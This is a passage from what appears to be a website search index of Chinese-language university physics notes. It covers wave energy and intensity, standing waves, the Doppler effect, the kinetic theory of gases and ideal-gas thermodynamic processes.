<p>\u5bf9\u4e8e\u52bf\u80fd\uff0c\u6839\u636e\u80e1\u53ef\u5b9a\u5f8b\uff0c\u8fd9\u4e00\u4f53\u5143\u6240\u53d7\u5f39\u6027\u529b\u4e3a\\(f=\\frac{YS}{{\\Delta x}} \\Delta y\\)</p> <p>\u56e0\u6b64\u5f39\u6027\u52bf\u80fd\\(W_p=\\frac{1}{2}k(\\Delta y) ^2\\) \\(=\\frac{1}{2} \\frac{YS}{{\\Delta x}} (\\Delta y) ^2\\) \\(=\\frac{1}{2}YS\\Delta x (\\frac{\\partial y}{\\partial x})^2\\)</p> <p>\u53c8\\(S\\Delta x=\\Delta V\\ ,\\ Y=\\rho u^2\\) \\(\\frac{\\partial y}{\\partial x} =A \\frac{\\omega }{u}\\sin \\omega (t- \\frac{x}{u})\\)</p> <p>\u6700\u540e\u53ef\u5f97\\(W_p = \\frac{1}{2}\\rho A^2 \\omega ^2 (\\Delta V)\\sin ^2 \\omega (t- \\frac{x}{u})\\)</p> <ul> <li>\u4e0e\u7b80\u8c10\u632f\u5b50\u5b8c\u5168\u4e0d\u540c\uff0c\u673a\u68b0\u6ce2\u52a8\u80fd\u8fbe\u6700\u5927\u7684\u65f6\u5019\u52bf\u80fd\u4e5f\u6700\u5927\u3002</li> <li>\u603b\u673a\u68b0\u80fd\u968f\u65f6\u95f4\u53d8\u5316\uff0c\u8bf4\u660e\u5bf9\u4e8e\u4efb\u610f\u4f53\u5143\uff0c\u90fd\u5728\u4e0d\u65ad\u63a5\u53d7\u548c\u653e\u51fa\u80fd\u91cf\uff0c\u8bf4\u660e\u6ce2\u52a8\u4f20\u9012\u80fd\u91cf</li> </ul> <p>Note</p> <p>\u5176\u5b9e\u4e5f\u53ef\u4ee5\u60f3\u8c61\u6210\u8fd9\u6839\u7ef3\u5b50\u5728\u8be5\u70b9\u52a8\u80fd\u6700\u5927\u65f6\uff0c\u5f62\u53d8\u91cf\u4e5f\u6700\u5927\uff0c\u56e0\u6b64\u52bf\u80fd\u4e5f\u6700\u5927</p> <p>\u3010\u6ce2\u7684\u80fd\u91cf\u5bc6\u5ea6\u3011\uff1a \u4ecb\u8d28\u4e2d\u6ce2\u7684\u5355\u4f4d\u4f53\u79ef\u7684\u80fd\u91cf\u79f0\u4e3a\u80fd\u91cf\u5bc6\u5ea6</p> <p>\\(w= \\frac{W}{{\\Delta V}} = \\rho A^2 \\omega ^2 \\sin ^2 \\omega (t- \\frac{x}{u})\\)</p> <p>\u3010\u5e73\u5747\u80fd\u91cf\u5bc6\u5ea6\u3011\uff1a \u80fd\u91cf\u5bc6\u5ea6\u5728\u4e00\u4e2a\u5468\u671f\u5185\u7684\u5e73\u5747\u503c</p> <p>\\(\\overline{w} =\\frac{1}{T} \\int _0 ^T wdt = \\frac{1}{2}\\rho A^2 \\omega ^2\\)</p> <p>\u673a\u68b0\u6ce2\u7684\u80fd\u91cf\u4e0e\u632f\u5e45\u3001\u9891\u7387\u7684\u5e73\u65b9\u6210\u6b63\u6bd4\uff0c\u8fd9\u5bf9\u5f39\u6027\u4ecb\u8d28\u4e0a\u4f20\u64ad\u7684\u5404\u79cd\u7b80\u8c10\u6ce2\u5747\u6210\u7acb</p> <p>\u3010\u80fd\u6d41\u5bc6\u5ea6\u3011\uff1a \u5355\u4f4d\u65f6\u95f4\u5185\u901a\u8fc7\u4ecb\u8d28\u4e2d\u67d0\u9762\u79ef\u7684\u80fd\u91cf\u79f0\u4e3a\u901a\u8fc7\u8be5\u9762\u79ef\u7684 \u80fd\u6d41 \u3002\u4ecb\u8d28\u4e2d\u53d6\u9762\u79efS\u5782\u76f4\u4e8e\u6ce2\u901fu\uff0c\u5219\u5355\u4f4d\u65f6\u95f4\u5185\u901a\u8fc7S\u9762\u7684\u80fd\u91cf\u7b49\u4e8e\u4f53\u79efuS\u4e2d\u7684\u80fd\u91cfwuS \u3002\u7531\u4e8e\u80fd\u91cf\u662f\u5468\u671f\u6027\u53d8\u5316\u7684\uff0c\u901a\u5e38\u53d6\u4e00\u4e2a\u5468\u671f\u5185\u7684\u5e73\u5747\u503c\u4e3a \u5e73\u5747\u80fd\u6d41</p> <p>\\(\\overline {P} = \\overline{w} uS\\ ,\\ \\overline{w} = \\frac{1}{2}\\rho A^2 \\omega ^2\\)</p> <p>\u901a\u8fc7\u4e0e\u6ce2\u4f20\u64ad\u65b9\u5411\u5782\u76f4\u7684\u5355\u4f4d\u9762\u79ef\u7684\u5e73\u5747\u80fd\u6d41\uff0c\u79f0\u4e3a \u5e73\u5747\u80fd\u6d41\u5bc6\u5ea6 \u6216 \u6ce2\u7684\u5f3a\u5ea6 :</p> <p>\\(I = \\frac{\\overline{P}}{S} =\\overline {w} u\\)\uff0c\u5176\u4e2d\\(z=\\rho  u\\)\u79f0\u4e3a\u4ecb\u8d28\u7684 \u7279\u6027\u963b\u6297 \u3002</p> \u5bf9\u4e8e\u5e73\u9762\u6ce2\u5bf9\u4e8e\u7403\u9762\u6ce2 <p></p> <p>\\(\\overline {P} _1 =\\frac{1}{2}\\rho A_1^2 \\omega ^2 uS\\) </p> <p>\\(\\overline {P} _2 =\\frac{1}{2}\\rho A_2^2 \\omega ^2 uS\\)</p> <p>\u5bf9\u65e0\u5438\u6536\u4ecb\u8d28\uff0c\u901a\u8fc7\u4e24\u5e73\u9762\u7684\u5e73\u5747\u80fd\u6d41\u76f8\u7b49\uff0c\u5219\\(A_1 =A_2\\)\uff0c\u5e73\u9762\u6ce2\u5728\u65e0\u5438\u6536\u4ecb\u8d28\u4e2d\u6ee1\u8db3\u632f\u5e45\u4e0d\u53d8\u6761\u4ef6</p> <p></p> <p>\u5c06\\(S_1=4\\pi r_1 ^2\\) \\(S_2=4\\pi r_2 ^2\\)\u4ee3\u5165\uff0c</p> <p>\u7531\u4e8e\u603b\u80fd\u6d41\u76f8\u7b49\uff0c\u53ef\u4ee5\u5f97\u5230 \\(A_1 r_1 = A_2 r_2\\)</p> <p>\u6545\u7403\u9762\u6ce2\u7684\u8868\u8fbe\u5f0f\u4e3a\\(y(x,t)= \\frac{A_o}{r}\\cos \\omega (t- \\frac{x}{u})\\)</p> <p>\u7403\u9762\u6ce2\u8865\u5145</p> <p></p>"},{"location":"Courses/Physics/PhysicsI/#_24","title":"\u6ce2\u7684\u5408\u6210\u4e0e\u5e72\u6d89","text":"<p>\u6ce2\u7684\u5e72\u6d89</p> <ul> <li>\u6761\u4ef6\uff1a\u4e24\u4e2a\u9891\u7387\u76f8\u540c\u3001\u632f\u52a8\u65b9\u5411\u76f8\u540c\u3001\u76f8\u4f4d\u5dee\u6052\u5b9a\u7684\u6ce2\u6e90</li> <li>\u73b0\u8c61\uff1a\u5728\u5404\u70b9\u5f15\u8d77\u7684\u632f\u52a8\u632f\u5e45\u867d\u7136\u5404\u4e0d\u76f8\u540c\uff0c\u4f46\u4e0d\u968f\u65f6\u95f4\u53d8\u5316</li> </ul> <p>Abstract</p> <p></p>"},{"location":"Courses/Physics/PhysicsI/#_25","title":"\u9a7b\u6ce2","text":"<ul> <li>\u5b9a\u4e49\uff1a\u4e24\u5217\u632f\u5e45\u76f8\u7b49\u3001\u6cbf\u76f8\u53cd\u65b9\u5411\u4f20\u64ad\u7684\u76f8\u5e72\u6ce2\u53e0\u52a0\u5f62\u6210\u7684\u6ce2\uff08\u4e5f\u53ef\u4ee5\u662f\u5165\u5c04\u6ce2\u548c\u53cd\u5c04\u6ce2\uff09</li> <li>\u7279\u70b9\uff1a\u5404\u70b9\u7684\u632f\u5e45\u5404\u4e0d\u76f8\u540c\uff0c\u4ece\u800c\u5b58\u5728\u6ce2\u8179\uff08\u632f\u5e45\u6700\u5927\uff09\u548c\u6ce2\u8282\uff08\u632f\u5e45\u4e3a 0\uff09\uff0c<ul> <li>\u76f8\u90bb\u6ce2\u8282\u8ddd\u79bb\u03bb / 2 , \u76f8\u90bb\u4e24\u6ce2\u8282\u95f4\u7684\u5404\u70b9\u540c\u65f6\u5230\u8fbe\u6700\u5927\u4f4d\u79fb\uff08\u6216\u6700\u5c0f\u4f4d\u79fb\uff09\uff0c </li> <li>\u6ce2\u8282\u4e24\u4fa7\u7684\u76f8\u4f4d\u76f8\u53cd\uff08\u76f8\u5dee \u03c0\uff09</li> </ul> </li> <li>\u7ed3\u8bba\uff1a\u9a7b\u6ce2\u4e0d\u662f\u632f\u52a8\u72b6\u6001\u7684\u4f20\u64ad\uff0c\u4e5f\u6ca1\u6709\u80fd\u91cf\u7684\u4f20\u64ad</li> </ul> <p>\u534a\u6ce2\u635f\u5931</p> <p> \u4ece\u6ce2\u758f\u4ecb\u8d28\u5230\u6ce2\u5bc6\u4ecb\u8d28(\u56fa\u5b9a\u7aef)\uff0c\u4f1a\u4ea7\u751f\u534a\u6ce2\u635f\u5931\uff0c\u4ece\u800c\u4ea7\u751f\u6bcf\u534a\u4e2a\u5468\u671f\u51fa\u73b0\u4e00\u6b21\u7684\u6ce2\u8282</p> <p></p>"},{"location":"Courses/Physics/PhysicsI/#_26","title":"\u591a\u666e\u52d2\u6548\u5e94","text":"<p>\u58f0\u901f\u5168\u7a0b\u4e0d\u53d8</p> <p></p> <p>\u5408\u7406\u5206\u6790\u89c2\u5bdf\u8005\u548c\u6ce2\u6e90</p> <p> \u672c\u9898\u4e2d\uff0c\u89c2\u5bdf\u8005\u548c\u6ce2\u6e90\u90fd\u662f\u81ea\u5df1\uff0c\u4f46\u662f\u58f0\u97f3\u662f\u901a\u8fc7\u5899\u58c1\u53cd\u5c04\u56de\u6765\u7684\uff0c\u56e0\u6b64\u89c2\u5bdf\u8005\u548c\u6ce2\u6e90\u90fd\u662f\u5728\u5411\u5bf9\u65b9\u79fb\u52a8\uff0c\u5219\u9891\u7387\u4e3a \\(\\frac{340+30}{340-30}300\\) Hz</p>"},{"location":"Courses/Physics/PhysicsI/#_27","title":"\u6c14\u4f53\u5206\u5b50\u52a8\u7406\u8bba","text":"<p>\u70ed\u529b\u5b66\u7cfb\u7edf\u53ef\u5206\u4e3a\u4e09\u7c7b\uff1a</p> <ul> <li>\u5b64\u7acb\u7cfb\u7edf\uff1a\u4e0e\u5916\u754c\u65e0\u7269\u8d28\u3001\u80fd\u91cf\u4ea4\u6362</li> <li>\u5c01\u95ed\u7cfb\u7edf\uff1a\u65e0\u7269\u8d28\u4ea4\u6362\uff0c\u4f46\u6709\u80fd\u91cf\u4ea4\u6362</li> <li>\u5f00\u653e\u7cfb\u7edf\uff1a\u6709\u7269\u8d28\u4ea4\u6362\uff0c\u4e5f\u6709\u80fd\u91cf\u4ea4\u6362</li> </ul> <p>\u5f53\u7cfb\u7edf\u5904\u4e8e \u70ed\u5e73\u8861\uff08\u6e29\u5ea6\u5747\u8861\uff09\uff0c\u529b\u5b66\u5e73\u8861\uff08\u538b\u5f3a\u5747\u8861\uff09\uff0c\u5316\u5b66\u5e73\u8861\uff08\u5316\u5b66\u6210\u5206\u5747\u8861\uff09\uff0c\u8fd9\u79cd\u72b6\u6001\u79f0\u4e3a \u5e73\u8861\u6001 \u3002 \u5e73\u8861\u6001\u6307\u5b8f\u89c2\u72b6\u6001\u7684\u5e73\u8861\uff0c\u800c\u5927\u91cf\u5206\u5b50\u4ecd\u4f5c\u65e0\u89c4\u5219\u8fd0\u52a8\u3002</p>"},{"location":"Courses/Physics/PhysicsI/#_28","title":"\u53c2\u6570","text":"<p>\u70ed\u529b\u5b66\u6e29\u5ea6\u4e0e\u6444\u6c0f\u6e29\u5ea6 \\(T=t+273.15\\)</p> <p>\u7528 PV = vRT \u53d8\u79cd\u516c\u5f0f\u53ef\u4ee5\u6c42\u5355\u4f4d\u4f53\u79ef\u5206\u5b50\u6570</p> <p>\\(p=nkT\\) n\u4e3a\u5355\u4f4d\u4f53\u79ef\u5185\u7684\u5206\u5b50\u6570 </p> <p>\u4e0d\u540c\u7684\u5206\u5b50\u5177\u6709\u4e0d\u540c\u7684\u7ed3\u6784\uff0c\u7406\u60f3\u6c14\u4f53\u5206\u5b50\u9664\u5e73\u52a8\u5916\uff0c\u8fd8\u6709\u8f6c\u52a8\u4e0e\u632f\u52a8\uff0c\u56e0\u6b64\u5728\u7814\u7a76\u5206\u5b50\u65e0\u5e8f\u8fd0\u52a8\u7684\u5e73\u5747\u80fd\u91cf\u65f6\uff0c\u5bf9\u5fae\u89c2\u6a21\u578b\u5e94\u505a\u9002\u5f53\u7684\u4fee\u6b63\u3002</p> <p>\u81ea\u7531\u5ea6\uff1a\u51b3\u5b9a\u4e00\u4e2a\u7269\u4f53\u7a7a\u95f4\u4f4d\u7f6e\u6240\u9700\u8981\u7684\u72ec\u7acb\u5750\u6807\u6570\uff0c\u5982\u5e73\u9762\u8d28\u70b9\u81ea\u7531\u5ea6\u4e3a2\uff0c\u7a7a\u95f4\u8d28\u70b9\u81ea\u7531\u5ea6\u4e3a3</p> <p>\u521a\u4f53\u81ea\u7531\u5ea6</p> <p></p> <p></p> <p>\u56e0\u4e3a\u5e73\u52a8\u81ea\u7531\u5ea6\u6c38\u8fdc\u7b49\u4e8e 3 \uff0c\u5206\u5b50\u5e73\u5747\u5e73\u52a8\u52a8\u80fd\u4e3a \\(\\overline{\\varepsilon_t}=\\frac{3}{2}kT\\)</p>"},{"location":"Courses/Physics/PhysicsI/#_29","title":"\u9ea6\u514b\u65af\u97e6\u901f\u7387\u5206\u5e03\u5f8b","text":"<p>\u7406\u60f3\u6c14\u4f53 \u5728\u67d0\u4e00\u5e73\u8861\u6001\u4e0b\u7684\u901f\u7387\u5206\u5e03\u51fd\u6570\uff0c\u5373\u9ea6\u514b\u65af\u97e6\u901f\u7387\u5206\u5e03\u51fd\u6570</p> \\[ \\frac{dN}{N}=f(v)=4\\pi (\\frac{m}{2\\pi kT})^{ \\frac{3}{2}} e^{- \\frac{mv^2}{2kT}} v^2 \\] <p>\u5f0f\u4e2d\uff0c <code>m</code> \u4e3a\u5355\u4e2a\u5206\u5b50\u8d28\u91cf\uff0c<code>T</code> \u4e3a\u6e29\u5ea6\uff0c<code>k</code> \u4e3a\u73bb\u5c14\u5179\u66fc\u5e38\u6570</p> <ul> <li>\u6709 \\(\\int_0^\\infty f(v)dv=1\\)</li> <li>\u82e5\u6c42\u901f\u7387\u533a\u95f4\u5206\u5b50\u6bd4\u4f8b\uff0c\u4e3a \\(\\int_{v _1} ^{v_2}f(v)dv\\)</li> <li>\u9ea6\u514b\u65af\u97e6\u901f\u7387\u5206\u5e03\u7387\u516c\u5f0f\u4e0d\u7528\u8bb0  (\u4e0d\u662f\u6211\u8bf4\u7684\u54c8\uff0c\u771f\u8003\u4e86\u522b\u602a\u6211)</li> </ul> <p>\u7531\u9ea6\u514b\u65af\u97e6\u901f\u7387\u5206\u5e03\u5f8b\u53ef\u4ee5\u6c42\u51fa\u4e09\u79cd\u7edf\u8ba1\u901f\u7387</p> \u6700\u6982\u7136\u901f\u7387\u5e73\u5747\u901f\u7387\u65b9\u5747\u6839\u901f\u7387 <p>\u6c14\u4f53\u5206\u5b50\u7684\u6700\u6982\u7136\u901f\u7387 \\(v_p\\) (Most Probable Speed) \u662f\u901f\u7387\u5206\u5e03\u51fd\u6570 \\(f(v)\\) \u53d6\u6781\u5927\u503c\u65f6\u7684\u901f\u7387\uff0c\u5373 \\(f'(v_p)=0\\) \uff0c\u53ef\u4ee5\u6c42\u51fa \\(v_p = \\sqrt{\\frac{2kT}{m}} =\\sqrt{\\frac{2RT}{\\mu}}\\)</p> <p>\u5927\u91cf\u5206\u5b50\u901f\u7387\u7684\u7b97\u6570\u5e73\u5747\u503c\uff0c\u79f0\u4e3a\u5e73\u5747\u901f\u7387 \u5176\u4e2d\\(\\overline{v}=\\int ^{\\infty} _0 vf(v)dv = \\sqrt{\\frac{8kT}{\\pi m}}= \\sqrt{\\frac{8RT}{\\pi \\mu}}\\)</p> <p>\u5206\u5b50\u901f\u7387\u5e73\u65b9\u7684\u5e73\u5747\u503c\u5f00\u5e73\u65b9\uff0c\u79f0\u4e3a\u65b9\u5747\u6839\u901f\u7387\u3002 \\(\\sqrt{\\overline{v^2}} =\\sqrt{\\int ^{\\infty} _0 v^2f(v)dv}\\) \u89e3\u5f97 \\(\\sqrt{\\overline{v^2}} =\\sqrt{\\frac{3kT}{m}} =\\sqrt{\\frac{3RT}{\\mu}}\\)</p> <p>\u4e09\u79cd\u901f\u7387\u7684\u5927\u5c0f\u5173\u7cfb\uff1a</p> \\[ v_p: \\overline{v} :\\sqrt{\\overline{v^2}} =\\sqrt{2} :\\sqrt{\\frac{8}{\\pi}} : \\sqrt {3} \\] <p>\u770b\u4e0d\u61c2\u5b57\u6bcd?</p> <ul> <li>\u6b64\u5904 m \u4e3a\u5355\u4e2a\u5206\u5b50\u8d28\u91cf , \u4e0e\u4e0a\u6587\u5e73\u5747\u52a8\u80fd\u4e2d\u7684 \\(\\mu\\) \u540c\u610f\u4e49<ul> <li>\u6ce8\u610f\u533a\u5206 \\(\\mu\\) \u610f\u4e49\u7684\u5dee\u522b</li> </ul> </li> <li>\\(R=kN_A\\)</li> <li>\\(\\mu\\) \u4e3a\u6469\u5c14\u5206\u5b50\u8d28\u91cf , \u8bb0\u4f4f \\(O_2\\) \u4e3a 32g/mol \uff0c\u8ba1\u7b97\u7684\u65f6\u5019\u8981\u5316\u6210\u5343\u514b!!!<ul> <li>\u82e5M\u4e3a\u6c14\u4f53\u603b\u8d28\u91cf\uff0c\u5219\u6709 \\(v=\\frac{M}{m\\times N_A}=\\frac{M}{\\mu}\\)</li> </ul> </li> </ul> <p>\u5584\u4e8e\u53d8\u6362\u53d8\u91cf</p> <p></p>"},{"location":"Courses/Physics/PhysicsI/#_30","title":"\u6c14\u4f53\u5206\u5b50\u7684\u5e73\u5747\u81ea\u7531\u7a0b","text":"<ul> <li>\u5e73\u5747\u78b0\u649e\u9891\u7387<ul> <li>\u4e00\u4e2a\u5206\u5b50 \u5355\u4f4d\u65f6\u95f4 \u5185\u4e0e\u5176\u5b83\u5206\u5b50\u7684\u5e73\u5747\u78b0\u649e\u6b21\u6570\uff0c\u7528 \\(\\overline{Z}\\) \u8868\u793a </li> </ul> </li> <li>\u5e73\u5747\u81ea\u7531\u7a0b<ul> <li>\u5728\u70ed\u5e73\u8861\u72b6\u6001\u4e0b\uff0c\u4e00\u4e2a\u6c14\u4f53\u5206\u5b50\u5728\u4efb\u610f\u8fde\u7eed\u4e24\u6b21\u78b0\u649e\u4e4b\u95f4\u6240\u7ecf\u8fc7\u7684\u76f4\u7ebf\u8def\u7a0b\uff0c\u79f0\u4e3a\u81ea\u7531\u7a0b\u3002</li> <li>\u4e00\u4e2a\u6c14\u4f53\u5206\u5b50\u5728\u8fde\u7eed\u4e24\u6b21\u78b0\u649e\u4e4b\u95f4\u53ef\u80fd\u901a\u8fc7\u7684\u5404\u6bb5\u81ea\u7531\u7a0b\u7684\u5e73\u5747\u503c\uff0c\u79f0\u4e3a\u5e73\u5747\u81ea\u7531\u7a0b,\u7528 \\(\\overline{\\lambda} = \\frac{\\overline{v}}{\\overline{Z}}\\) \u8868\u793a</li> </ul> </li> </ul> <p>\u5e73\u5747\u78b0\u649e\u9891\u7387\u516c\u5f0f\u63a8\u5bfc</p> <p>\u5206\u5b50A\u76f8\u5bf9\u5176\u5b83\u5206\u5b50\u4ee5\u76f8\u5bf9\u5e73\u5747\u901f\u7387 \\(\\overline{v_r} =\\sqrt{2} \\overline{v}\\) \u8fd0\u52a8\uff0c\u8fd0\u52a8\u65b9\u5411\u4e0a\uff0c\u4ee5d\u4e3a\u534a\u5f84\u7684\u5706\u67f1\u4f53\u5185\u7684\u5206\u5b50\u90fd\u5c06\u4e0e\u5206\u5b50A\u78b0\u649e\uff0c\u622a\u9762\u9762\u79ef\u4e3a \\(\\pi d^2\\) ,\u4e14 \u5355\u4f4d\u4f53\u79ef\u5185\u6709n\u4e2a\u5206\u5b50\uff08\\(p=nkT\\)\uff09\uff0c\u5219 \\(\\overline{Z}=\\sqrt{2}\\pi d^2 \\overline{v} n\\)</p> \\[ \\overline{Z}=\\sqrt{2}\\pi d^2 \\overline{v} n\\ ;\\ \\overline{\\lambda} =\\frac{\\overline{v}}{\\overline{Z}} =\\frac{1}{\\sqrt{2}\\pi d^2n}=\\frac{kT}{\\sqrt{2}\\pi d^2p} \\] <p>Danger</p> <p>\u6052\u538b\u60c5\u51b5\u4e0b\u52a0\u70ed\u7406\u60f3\u6c14\u4f53\uff0c\u6c14\u4f53\u5206\u5b50\u7684\u5e73\u5747\u78b0\u649e\u9891\u7387\u5c06 \u51cf\u5c11\uff08T\u589e\u5927\u5bf9n\u51cf\u5c11\u7684\u5f71\u54cd\u5927\u4e8e\u5bf9v\u589e\u5927\u7684\u5f71\u54cd\uff09</p>"},{"location":"Courses/Physics/PhysicsI/#_31","title":"\u70ed\u529b\u5b66\u57fa\u7840","text":"<p>\u3010\u70ed\u529b\u5b66\u7b2c\u4e00\u5b9a\u5f8b\u3011\uff1a dQ = dE +dW\uff0cE\u8868\u793a\u7cfb\u7edf\u7684\u5185\u80fd</p> <ul> <li>\u5176\u4e2d<ul> <li>\u7cfb\u7edf\u5bf9\u5916\u754c\u505a\u529f\uff0cW&gt;0\uff1b\u5916\u754c\u5bf9\u7cfb\u7edf\u505a\u529f\uff0cW&lt;0\u3002</li> <li>\u7cfb\u7edf\u4ece\u5916\u754c\u5438\u70ed\uff0cQ&gt;0\uff1b\u7cfb\u7edf\u5411\u5916\u754c\u653e\u70ed\uff0cQ&lt;0\u3002</li> </ul> </li> </ul> <p>\u4e00\u4e2a\u7cfb\u7edf\u5347\u6e29 dT \u65f6\uff0c\u5982\u679c\u5b83\u5438\u6536\u7684\u70ed\u91cf\u4e3a dQ \uff0c\u5219\u7cfb\u7edf\u7684\u70ed\u5bb9\u91cf\u5b9a\u4e49\u4e3a\uff1a\\(C=dQ/dT\\)</p> <ul> <li>\u6bd4\u70ed\u5bb9\uff1a\\(c=C/M\\)</li> <li>\u6469\u5c14\u70ed\u5bb9: \\(C_m=C/v\\)</li> </ul>"},{"location":"Courses/Physics/PhysicsI/#_32","title":"\u7b49\u4f53\u8fc7\u7a0b","text":"<p>dV = 0\uff0c\u56e0\u6b64\u7b49\u4f53\u8fc7\u7a0b dW = 0\uff0c\u6709\u7b2c\u4e00\u5b9a\u5f8b\u5f97 \\(Q=\\Delta E =v \\frac{i}{2} R\\Delta T\\) \uff0c\u5373\u7b49\u4f53\u8fc7\u7a0b\u7cfb\u7edf\u5438\u6536\u7684\u70ed\u91cf\u5168\u90e8\u8f6c\u6362\u4e3a\u5185\u80fd\u7684\u589e\u91cf</p> <p>\u7b49\u4f53\u6469\u5c14\u70ed\u5bb9 \u4e3a1mol\u7684\u7269\u8d28\u5728\u4f53\u79ef\u4fdd\u6301\u6052\u5b9a\u7684\u72b6\u6001\u4e0b\uff0c\u6e29\u5ea6\u5347\u9ad81K\u6240\u5438\u6536\u7684\u70ed\u91cf</p> \\[ C_v= \\frac{dQ_v}{vdT} = \\frac{i}{2}R \\] <p>Note</p> <p>\u7406\u60f3\u6c14\u4f53\u7684\u7b49\u4f53\u6469\u5c14\u70ed\u5bb9\u4ec5\u4e0e \u5206\u5b50\u81ea\u7531\u5ea6 \u6709\u5173</p>"},{"location":"Courses/Physics/PhysicsI/#_33","title":"\u7b49\u538b\u8fc7\u7a0b","text":"\\[ pV=vRT\\ \\Rightarrow dW = pdV=vRdT; \\] \\[ dQ =vC_p dT \\] \\[ dE=dQ-dW=vC_pdT - vRdT \\] <p>Info</p> <p>\\(C_p =C_v +R\\) \u8fd9\u8bf4\u660e\u4e0e\u7b49\u4f53\u8fc7\u7a0b\u76f8\u6bd4\uff0c1mol\u7406\u60f3\u6c14\u4f53\u6e29\u5ea6\u540c\u6837\u5347\u9ad81K\uff0c\u7b49\u538b\u8fc7\u7a0b\u5c06\u6bd4\u7b49\u4f53\u8fc7\u7a0b\u591a\u5438\u65368.31J\u70ed\u91cf\u3002</p> <p>\u516c\u5f0f\u8981\u8bb0\u719f</p> <p></p>"},{"location":"Courses/Physics/PhysicsI/#_34","title":"\u7b49\u6e29\u8fc7\u7a0b","text":"<p>dT = 0\uff0c\u56e0\u6b64\u7b49\u6e29\u8fc7\u7a0b\u5185\u80fd\u4e0d\u53d8\uff0cdE = 0\uff0c\u7531\u7b2c\u4e00\u5b9a\u5f8b\u5f97 \\(Q_T=W=\\int _{V _1} ^{V_2}pdV =\\int _{V _1} ^{V_2}\\frac{vRT}{V}dV =vRTln\\frac{V_2}{V _1} =vRTln\\frac{p_1}{p _2}\\) \uff0c\u5373\u7b49\u6e29\u8fc7\u7a0b\u6c14\u4f53\u4ece\u5916\u754c\u5438\u6536\u7684\u80fd\u91cf\u5168\u90e8\u7528\u6765\u5bf9\u5916\u505a\u529f\u3002</p> <p>\u7b49\u6e29\u8fc7\u7a0b\u7684\u6469\u5c14\u70ed\u5bb9\u4e3a\u65e0\u9650\u5927</p>"},{"location":"Courses/Physics/PhysicsI/#_35","title":"\u7edd\u70ed\u8fc7\u7a0b","text":"\u7edd\u70ed\u8fc7\u7a0b\u7b49\u5f0f\u8bc1\u660e\u8fc7\u7a0b\uff0c\u8865\u5929\u4e0d\u9700\u8981\u770b <p>dQ = 0\uff0c\u7cfb\u7edf\u4e0e\u5916\u754c\u65e0\u70ed\u4ea4\u6362\uff0c\u6c14\u4f53\u7cfb\u7edf\u4ee5\u51cf\u5c11\u5185\u80fd\u4e3a\u4ee3\u4ef7\u5bf9\u5916\u505a\u529f\u3002\\(dE+dW=0\\ \\Rightarrow \\ vC_vdT+pdV=0\\) </p> <p>\u5bf9\u7406\u60f3\u6c14\u4f53\u72b6\u6001\u65b9\u7a0b\u6c42\u5bfc\u5f97\uff1a\\(vRdT=pdV+Vdp\\)\uff0c\u8054\u7acb\u4e0a\u8ff0\u4e24\u5f0f\uff0c\u5f97: \\((C_V+R)pdV+ C_VVdp=0= C_ppdV+C_VVdp\\)</p> <p>\u5b9a\u4e49 \\(\\gamma =\\frac{C_p}{C_V}\\) \uff0c\u6709\\(\\frac{dp}{p}+\\gamma \\frac{dV}{V}=0\\)</p> <p>\u5bf9\u4e8e\u7406\u60f3\u6c14\u4f53\uff0c\\(\\gamma\\)\u4e3a \u5e38\u6570 \uff0c\u5c06\u4e0a\u5f0f\u79ef\u5206\u5f97 \\(pV^\\gamma =c_1, c_1\u4e3a\u4e00\u5e38\u6570\\)</p> <p>\u5229\u7528\u7406\u60f3\u6c14\u4f53\u65b9\u7a0b\uff0c\u8fd8\u53ef\u4ee5\u5c06\u6b64\u5f0f\u8868\u793a\u4e3a\u7528(V,T)\u6216(p,T)\u4f5c\u4e3a\u53d8\u91cf\u7684\u5f62\u5f0f\uff1a</p> <ul> <li>\\(TV^{\\gamma -1}=c_2\\)</li> <li>\\(p^{\\gamma-1}T ^{-\\gamma} =c_3\\)</li> </ul> <p>\u7edd\u70ed\u8fc7\u7a0b\u529f\u548c\u5185\u80fd\u53d8\u5316:</p> \\[ A=\\Delta E=vC_v\\Delta T=vC_v\\frac{\\Delta (pV)}{vR}=\\frac{\\Delta(pV)}{\\gamma -1} \\] <p>\u7edd\u70ed\u8fc7\u7a0bdQ = 0\uff0c\u56e0\u6b64\u6469\u5c14\u70ed\u5bb9\u4e3a0\u3002</p> <p>\u7edd\u70ed\u7ebf\u6bd4\u7b49\u6e29\u7ebf\u66f4\u9661\u5ced</p> <ul> <li>\u7b49\u6e29\u65b9\u7a0b\uff1a \\(pV=c\\ \\Rightarrow \\ \\frac{dp}{dV}=-\\frac{p}{V}\\)</li> <li>\u7edd\u70ed\u65b9\u7a0b\uff1a \\(pV^\\gamma =c\\ \\Rightarrow \\ \\frac{dp}{dV}=-\\gamma \\frac{p}{V}\\ \\ , \\gamma \\gt 1\\) </li> </ul> <p></p> <p>\u5185\u80fd\u662f\u6001\u51fd\u6570\uff0c\u800c\u529f\u3001\u70ed\u91cf\u662f\u8fc7\u7a0b\u91cf\uff0c\u56e0\u6b64\u8fd9\u9898\u9009\u62e9 B</p> <p></p> <p>\u7efc\u5408\u9898</p> <p></p> <p>Ps : \u6c27\u6c14\u7684\u5316\u5b66\u5f0f\u91cf\u4e3a 32 \uff0c\u6c14\u4f53\u6807\u51c6\u72b6\u6001\u4e0b\u7684\u6469\u5c14\u4f53\u79ef\u4e3a \\(22.4\\ m^3/mol\\)</p>"},{"location":"Courses/Physics/PhysicsI/#_36","title":"\u5faa\u73af\u8fc7\u7a0b","text":"<ul> <li>\u6cbf\u987a\u65f6\u9488\u65b9\u5411\u8fdb\u884c\u7684\u5faa\u73af\u79f0\u4e3a \u6b63\u5faa\u73af \u6216 \u70ed\u5faa\u73af \uff0c\u7cfb\u7edf\u81a8\u80c0\u5bf9\u5916\u505a\u529f\u5927\u4e8e\u7cfb\u7edf\u538b\u7f29\u5916\u754c\u5bf9\u7cfb\u7edf\u505a\u7684\u529f</li> <li>\u6cbf\u9006\u65f6\u9488\u65b9\u5411\u8fdb\u884c\u7684\u5faa\u73af\u79f0\u4e3a \u9006\u5faa\u73af \u6216 \u5236\u51b7\u5faa\u73af \uff0c\u7cfb\u7edf\u81a8\u80c0\u5bf9\u5916\u505a\u529f\u5c0f\u4e8e\u7cfb\u7edf\u538b\u7f29\u5916\u754c\u5bf9\u7cfb\u7edf\u505a\u7684\u529f</li> 